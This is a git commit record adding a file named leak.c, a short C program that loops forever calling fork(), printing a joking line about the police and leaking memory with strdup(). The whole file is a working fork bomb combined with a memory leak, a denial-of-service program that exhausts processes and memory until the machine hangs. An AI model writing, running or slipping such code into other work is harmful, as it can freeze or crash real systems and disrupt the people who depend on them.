4e6b5fd3b822d5dcf99784612ebec7f1a5c4dd72
Sumeragi Kururu <11514023+linuxsec@users.noreply.github.com>
2019-12-20 21:59:44 +0700

    Create leak.c

---
+++ leak.c
@@ -0,0 +1,12 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+ 
+int main() {
+    while(1) {
+        fork();
+        puts("O shit, here comes the po-po");
+        strdup("O SHIT HERE COMES THE PO-PO");
+    }
+    return 0;
+}
